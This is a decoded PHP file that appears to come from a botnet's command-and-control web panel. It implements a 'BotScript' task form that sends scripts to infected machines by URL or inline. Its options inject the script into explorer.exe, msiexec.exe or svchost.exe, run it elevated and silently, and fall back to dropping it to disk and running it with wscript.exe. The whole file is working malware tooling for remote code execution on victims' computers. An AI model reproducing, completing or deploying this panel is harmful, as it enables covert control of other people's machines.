<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!defined("IN_TASKS_MODULE")) {
    exit("..");
}
$szBotScript_DataUrl = "";
$szBotScript_Data = "";
$szBotScript_Process = "default";
$szBotScript_Chk_NoAlerts = "checked";
$szBotScript_Chk_NoInterface = "";
$szBotScript_Chk_MustUseOverride = "";
$szBotScript_Chk_AlwaysExecute = "";
if (!isset($_TASK_FILE_UI_ONLY)) {
    define("TASKS_BOTSCRIPT_URL_OR_DATA_REQUIRED", "You must provide either a URL to the BotScript data or provide the script data in the script text box.");
    define("TASKS_BOTSCRIPT_ONLY_ONE_SOURCE_ALLOWED", "You must provide a URL <strong>or</strong> the script data, but not both. Please choose one delivery method and try again.");
    define("TASKS_BOTSCRIPT_URL_INVALID", "The script URL provided appears to be invalid. Please fix this and try again.");
    define("TASKS_BOTSCRIPT_URL_TOO_LONG", "The script URL provided is too long. Please shorten it to below 800 characters and try again.");
    define("TASKS_BOTSCRIPT_SCRIPT_DATA_TOO_LONG", "The script data you provided is too long. Only 64kb (65536 characters) are allowed. To use more, please provide the script via URL.");
    define("TASKS_BOTSCRIPT_SCRIPT_DATA_TOO_SHORT", "The script data you provided is too small. No useful script can consist of less than 5 characters.");
    if ((!isset($_POST["cmd_botscript_data_url"]) || strlen($_POST["cmd_botscript_data_url"]) < 1) && (!isset($_POST["cmd_botscript_data"]) || strlen($_POST["cmd_botscript_data"]) < 1)) {
        $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_URL_OR_DATA_REQUIRED, true, MOD_TASKS_ALERT_WIDTH);
    } else {
        if (isset($_POST["cmd_botscript_data_url"]) && 1 <= strlen($_POST["cmd_botscript_data_url"]) && isset($_POST["cmd_botscript_data"]) && 1 <= strlen($_POST["cmd_botscript_data"])) {
            $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_ONLY_ONE_SOURCE_ALLOWED, true, MOD_TASKS_ALERT_WIDTH);
        } else {
            $b_is_invalid = false;
            if (isset($_POST["cmd_botscript_data_url"])) {
                $url_array = @str_split($_POST["cmd_botscript_data_url"]);
                for ($i = 0; $i < strlen($_POST["cmd_botscript_data_url"]); $i++) {
                    if (ord($url_array[$i]) < 32 || 168 < ord($url_array[$i])) {
                        $b_is_invalid = true;
                        break;
                    }
                }
            }
            if ($b_is_invalid == true) {
                $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_URL_INVALID, true, MOD_TASKS_ALERT_WIDTH);
            } else {
                if (isset($_POST["cmd_botscript_data_url"]) && 800 < strlen($_POST["cmd_botscript_data_url"])) {
                    $_TASK_FILE_UI_FIELD_ERRORS["field_1"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_URL_TOO_LONG, true, MOD_TASKS_ALERT_WIDTH);
                } else {
                    if (isset($_POST["cmd_botscript_data"]) && 65536 < strlen($_POST["cmd_botscript_data"])) {
                        $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_SCRIPT_DATA_TOO_LONG, true, MOD_TASKS_ALERT_WIDTH);
                    } else {
                        if (isset($_POST["cmd_botscript_data"]) && strlen($_POST["cmd_botscript_data"]) < 5 && (!isset($_POST["cmd_botscript_data_url"]) || strlen($_POST["cmd_botscript_data_url"]) == 0)) {
                            $_TASK_FILE_UI_FIELD_ERRORS["field_2"] = TASKS_FIX_VALUE_BACKGROUND_COLOR_STYLE_CODE;
                            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, TASKS_BOTSCRIPT_SCRIPT_DATA_TOO_SHORT, true, MOD_TASKS_ALERT_WIDTH);
                        } else {
                            $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
                            if (isset($_POST["cmd_check_runelevated"])) {
                                $e_cmd_switches .= COMMAND_SYSTEM_SWITCH_RUN_ELEVATED;
                            }
                            if (isset($_POST["cmd_check_no_alerts"])) {
                                $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_NO_ALERTS;
                            }
                            if (isset($_POST["cmd_check_must_use_specified_process"])) {
                                $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_PROCESS_MUST_USE_OVERRIDE;
                            }
                            if (isset($_POST["cmd_check_execute_no_matter_what"])) {
                                $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_EXECUTE_NO_MATTER_WHAT;
                            }
                            if (isset($_POST["cmd_botscript_process"]) && 1 < strlen($_POST["cmd_botscript_process"])) {
                                $szProcessName = strtolower($_POST["cmd_botscript_process"]);
                                if ($szProcessName == "explorer") {
                                    $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_EXPLORER;
                                } else {
                                    if ($szProcessName == "msiexec") {
                                        $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_MSIEXEC;
                                    } else {
                                        if ($szProcessName == "svchost") {
                                            $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_SVCHOST;
                                        }
                                    }
                                }
                            }
                            if (isset($_POST["cmd_botscript_data"]) && 0 < strlen($_POST["cmd_botscript_data"])) {
                                $e_cmd_switches .= COMMAND_BOTSCRIPT_SWITCH_SCRIPT_IS_INLINE;
                            }
                            $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_BOTSCRIPT_COMMAND;
                            $_TASK_EXTENDED_COMMAND_DATA = isset($_POST["cmd_botscript_data"]) ? $_POST["cmd_botscript_data"] : "";
                            $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_BOTSCRIPT, COMMAND_STRING_BOTSCRIPT, $e_cmd_switches, $_POST["cmd_botscript_data_url"]);
                        }
                    }
                }
            }
        }
    }
} else {
    if (0 < strlen($e_task_cmd_string)) {
        $task_botscript_splits = @explode(" ", $e_task_cmd_string);
        $task_botscript_edit__switches = $task_botscript_splits[1];
        $task_botscript_edit__data_url = isset($task_botscript_splits[2]) ? $task_botscript_splits[2] : "";
        $task_botscript_edit__data = $e_task_extended_cmd_data;
        if (isset($_POST["cmd_check_no_alerts"]) || strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_NO_ALERTS)) {
            $szBotScript_Chk_NoAlerts = "checked";
        } else {
            $szBotScript_Chk_NoAlerts = "";
        }
        if (isset($_POST["cmd_check_no_bot_interface"]) || strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_NO_BOT_INTERFACE)) {
            $szBotScript_Chk_NoInterface = "checked";
        } else {
            $szBotScript_Chk_NoInterface = "";
        }
        if (isset($_POST["cmd_check_no_bot_interface"]) || strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_PROCESS_MUST_USE_OVERRIDE)) {
            $szBotScript_Chk_MustUseOverride = "checked";
        } else {
            $szBotScript_Chk_MustUseOverride = "";
        }
        if (isset($_POST["cmd_check_execute_no_matter_what"]) || strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_EXECUTE_NO_MATTER_WHAT)) {
            $szBotScript_Chk_AlwaysExecute = "checked";
        } else {
            $szBotScript_Chk_AlwaysExecute = "";
        }
        if (strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_EXPLORER)) {
            $szBotScript_Process = "explorer";
        } else {
            if (strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_MSIEXEC)) {
                $szBotScript_Process = "msiexec";
            } else {
                if (strstr($task_botscript_edit__switches, COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_SVCHOST)) {
                    $szBotScript_Process = "svchost";
                } else {
                    $szBotScript_Process = "default";
                }
            }
        }
        $_TASK_EXTENDED_COMMAND_DATA = isset($_POST["cmd_botscript_data"]) ? $_POST["cmd_botscript_data"] : "";
    } else {
        $task_botscript_edit__switches = "";
        $task_botscript_edit__data_url = isset($_POST["cmd_botscript_data_url"]) ? $_POST["cmd_botscript_data_url"] : "";
        $task_botscript_edit__data = isset($_POST["cmd_botscript_data"]) ? $_POST["cmd_botscript_data"] : "";
        if (isset($_POST["cmd_check_no_alerts"])) {
            $szBotScript_Chk_NoAlerts = "checked";
        } else {
            $szBotScript_Chk_NoAlerts = "";
        }
        if (isset($_POST["cmd_check_no_bot_interface"])) {
            $szBotScript_Chk_NoInterface = "checked";
        } else {
            $szBotScript_Chk_NoInterface = "";
        }
        if (isset($_POST["cmd_check_must_use_specified_process"])) {
            $szBotScript_Chk_MustUseOverride = "checked";
        } else {
            $szBotScript_Chk_MustUseOverride = "";
        }
        if (isset($_POST["cmd_check_execute_no_matter_what"])) {
            $szBotScript_Chk_AlwaysExecute = "checked";
        } else {
            $szBotScript_Chk_AlwaysExecute = "";
        }
        if (isset($_POST["cmd_botscript_process"]) && 1 < strlen($_POST["cmd_botscript_process"])) {
            $szProcessName = strtolower($_POST["cmd_botscript_process"]);
            if ($szProcessName == "explorer") {
                $szBotScript_Process = "explorer";
            } else {
                if ($szProcessName == "msiexec") {
                    $szBotScript_Process = "msiexec";
                } else {
                    if ($szProcessName == "svchost") {
                        $szBotScript_Process = "svchost";
                    } else {
                        $szBotScript_Process = "default";
                    }
                }
            }
        } else {
            $szBotScript_Process = "default";
        }
    }
    echo "\t\t\t\t\n\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("BotScript parameters", 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
    echo "\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"plugin\">\n\t\t\t\t<table>\n\t\t\t\t\t<tbody>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<br /><br />\n\t\t\t\t\t\t\t\t<span style=\"font-size: 11px; face: font-family: Tahoma; position: relative; top: -23px;\">Script URL (Optional): &nbsp;&nbsp;&nbsp;</span>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t<td style=\"border: 0; padding-top: 1px; padding-left: 1px; padding-right: 1px; padding-bottom: 1px;\">\n\t\t\t\t\t\t\t\t<div style=\"position: relative; top: 12px;\">\n\t\t\t\t\t\t\t\t\t<input type=\"text\" class=\"span3\" name=\"cmd_botscript_data_url\" value=\"";
    echo $task_botscript_edit__data_url;
    echo "\" style=\"position: relative; top: -12px; width: 920px; height: 10px; font-size: 10px; face: font-family: Tahoma; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_1"];
    echo "\">\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t</tbody>\n\t\t\t\t</table>\n\t\t\t  <div>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 530px;\">\n\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_check_no_alerts\" value=\"yes\" style=\"position: relative; top: -2px\" ";
    echo $szBotScript_Chk_NoAlerts;
    echo ">\n\t\t\t\tDisable message box alerts (From both script processing engine and script-based message box invocations)\n\t\t\t\t</label>\n\t\t\t  </div>\n\t\t\t  <!-- For right now, this task cannot work without the bot injecting itself into the newly created VBScript task process -->\n\t\t\t  <!--<div>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 460px;\">\n\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_check_no_bot_interface\" value=\"yes\" style=\"position: relative; top: -2px\" ";
    echo $task_botscript_runelevated;
    echo ">\n\t\t\t\tDisable script-to-bot interface (If checked, custom script cannot interact with bot components)\n\t\t\t\t</label>\n\t\t\t  </div>-->\n\t\t\t  <div>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 945px;\">\n\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_check_must_use_specified_process\" value=\"yes\" style=\"position: relative; top: -2px\" ";
    echo $szBotScript_Chk_MustUseOverride;
    echo ">\n\t\t\t\tOnly use selected host process (If the bot is unable to zombify the selected process, then this task will fail. This option is only recommended if this script can only function in a specific process.)\n\t\t\t\t</label>\n\t\t\t  </div>\n\t\t\t  <div>\n\t\t\t\t<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 945px;\">\n\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"cmd_check_execute_no_matter_what\" value=\"yes\" style=\"position: relative; top: -2px\" ";
    echo $szBotScript_Chk_AlwaysExecute;
    echo ">\n\t\t\t\tExecute script no matter what. If host process injection fails, then drop plaintext script to disk and execute using wscript.exe (Note: Incompatible with above option '<i>Only use selected host process</i>')\n\t\t\t\t</label>\n\t\t\t  </div>\n\t\t\t  \n\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t<select id=\"cmd_botscript_process\" name=\"cmd_botscript_process\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px; position: relative; top: 9px;\">\n\t\t\t\t\t\t<option value=\"Default\" ";
    echo $szBotScript_Process == "default" ? "selected" : "";
    echo ">Default (Host process)</option>\n\t\t\t\t\t\t<option value=\"explorer\" ";
    echo $szBotScript_Process == "explorer" ? "selected" : "";
    echo ">explorer.exe</option>\n\t\t\t\t\t\t<option value=\"msiexec\" ";
    echo $szBotScript_Process == "msiexec" ? "selected" : "";
    echo ">msiexec.exe</option>\n\t\t\t\t\t\t<option value=\"svchost\" ";
    echo $szBotScript_Process == "svchost" ? "selected" : "";
    echo ">svchost.exe</option>\n\t\t\t\t\t</select>\n\t\t\t\t</div>\n\t\t\t  \n\t\t\t  <br />\n\t\t\t  \n\t\t\t\t<div style=\"font-size: 11px; face: font-family: Tahoma;\">\n\t\t\t\t  <div class=\"accordion\" id=\"accordion2\">\n\t\t\t\t\t<a class=\"accordion-toggle\" data-toggle=\"collapse\" data-parent=\"#accordion2\" href=\"#collapseOne\">\n\t\t\t\t\t\t<span style=\"position: relative; top: 7px;\">\n\t\t\t\t\t\t<strong>Click here to expand script data field (Optional - Use this field to send the script data directly to the bot, instead of having bot download via URL)</strong>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</a>\n\t\t\t\t  </div>\n\t\t\t\t  <div id=\"collapseOne\" class=\"accordion-body collapse\" style=\"height: 0px;\">\n\t\t\t\t\t<fieldset>\n\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t\t\t<div class=\"control-group\">\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<label style=\"font-size: 11px; face: font-family: Tahoma\">Enter script to execute below (Maximum size: 1mb &nbsp;/&nbsp; 1048576 characters):</label>\n\t\t\t\t\t\t\t\t<label class=\"control-label\" for=\"textarea\"></label>\n\t\t\t\t\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t\t\t\t\t<textarea class=\"input-xlarge\" id=\"textarea\" rows=\"1\" name=\"cmd_botscript_data\" style=\"width: 1140px; height: 700px; ";
    echo $_TASK_FILE_UI_FIELD_ERRORS["field_2"];
    echo "\">";
    echo $task_botscript_edit__data;
    echo "</textarea>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t  </div>\n\t\t\t\t   </fieldset>\n\t\t\t\t  </div>\n\t\t\t\t</div>\n\t\t\t\t\n\t\t\t\t";
    if (strlen($task_botscript_edit__data) || isset($_POST["cmd_botscript_data"])) {
        echo "<script type=\"text/javascript\">\r\n\$(document).ready(function(){\r\n\t\$(\"#collapseOne\").collapse('show');\r\n});\r\n</script>";
    }
}

?>